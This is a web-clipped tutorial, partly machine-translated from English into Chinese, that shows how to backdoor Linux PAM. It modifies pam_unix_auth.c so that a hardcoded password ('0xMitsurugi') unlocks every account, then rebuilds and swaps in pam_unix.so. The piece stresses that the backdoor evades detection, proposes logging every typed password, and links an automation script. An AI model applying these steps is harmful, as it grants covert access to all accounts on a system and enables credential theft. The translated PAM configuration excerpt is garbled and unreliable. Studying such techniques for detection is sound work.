> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [infosecwriteups.com](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

> Under Linux (and other Oses), authentification of users is made through Pluggable Authentication Modu......

![](https://miro.medium.com/max/1400/0*9Q9FxYR5By3Rqjzn)

Photo by [30daysreplay Social Media Marketing](https://unsplash.com/@30daysreplay?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)

Under Linux (and other Oses), authentification of users is made through Pluggable Authentication Module, aka [PAM](https://en.wikipedia.org/wiki/Pluggable_authentication_module). Having centralized authentication is a good thing. But it has a drawback: if you trojanize it, you get key for everything. _Trojan once, pwn everywhere!_

Pam has three concepts: username, password and service. Its role is authenticate people to a service with a password.

Pam configuration is done under /etc/pam.d/ directory where each service has its own file:

```
root@dojo:/etc/pam.d# ls  
 atd             common-password        lightdm-greeter       polkit-1      sudo  
 chfn            common-session         login       ppp       systemd-user  
 chpasswd        common-session-noninteractive      runuser   vmtoolsd  
 chsh            cron                   newusers    runuser-l xscreensaver  
 common-account  lightdm                other       sshd  
 common-auth     lightdm-autologin      passwd      su  
 root@dojo:/etc/pam.d#

```

Basically, each one of those file calls a shared library, where the authentication or other kind things related to auth is done:

```
root@dojo:/etc/pam.d# 头部登录  
 #  
 # Shadow `login' 服务的 PAM 配置文件  
 #  
 # 在失败的情况下强制最小延迟（以微秒为单位）。  
 # （替换 login.defs 中的 `FAIL_DELAY' 设置）  
 # 请注意，其他模块可能需要另一个最小延迟。（例如，  
 # 要禁用任何延迟，您应该将 nodelay 选项添加到 pam_unix)  
 auth 可选 pam_faildelay.so 延迟=3000000  
 root@dojo:/etc/pam.d#

```

这就是所有服务的相同类型的配置文件。正如我所说，我们想要后门 PAM。我们不想对所有内容都进行后门，我们只想能够使用选择的密码成功进行身份验证，而与用户的真实密码无关。

几乎所有的服务都包含**common-auth**文件，你可以通过它的名字猜到这里做了什么。

common-auth 文件有许多指令，但这里唯一重要的一行是检查用户密码的那一行：

```
auth [success=1 default=ignore] pam_unix.so nullok_secure

```

common-auth 文件调用**pam_unix.so**共享库，并在此处完成用户身份验证。这个文件的逻辑很容易理解：

*   获取用户名
*   获取密码
*   调用子函数来根据用户名验证密码

那么，为什么不添加**_if_**语句呢？

*   获取用户名
*   获取密码
*   如果密码 == “0xMitsurugi” 则授予访问权限，否则调用合法子函数

转到 PAM 的来源（取决于您的发行版，使用与您相同的版本号..）并查看 pam_unix_auth.c 文件中的第 170/180 行：

mitsurugi@dojo:~/chall/PAM/pam_deb/pam-1.1.8$ vi modules/pam_unix/pam_unix_auth.c

![](https://miro.medium.com/max/1126/0*yd-gw-KNDPigOeGM.png)

让我们通过以下方式更改：

![](https://miro.medium.com/max/1212/0*2s0vHSHqASz89b4k.png)

重新编译pam_unix_auth.c，结束替换pam_unix.so文件：

```
mitsurugi@dojo:~/chall/PAM/pam_deb/pam-1.1.8$make  
  (...)  
 mitsurugi@道场：~/chall/PAM/pam_deb/pam-1.1.8$sudo cp\  
  /home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \  
  /lib/x86_64-linux-gnu/security/  
 mitsurugi@道场：~/chall/PAM/pam_deb/pam-1.1.8$

```

尝试使用**login**、**ssh**、**sudo**、**su**、**屏幕保护程序**，您的访问权限将被授予“0xMitsurugi”密码。开放所有帐户的访问权限 \o/

最好的部分是其他一切都照常工作。输入您的真实密码，它可以工作。放一个坏的，它失败了。用户可以更改密码，可以审计影子文件的强度，可以检查隐藏文件，可以检查配置文件修改，打开端口，“奇怪的日志”，你什么都得不到，但攻击者仍然可以得到这样做的另一个很大的好处是它可以长时间不被发现。

您还可以添加日志功能以捕获所有输入的密码，这是留给读者的练习。

真正的朋友不会为他们朋友的机器安装后门。

5/自动化脚本
-------

点击[这里](https://github.com/zephrax/linux-pam-backdoor)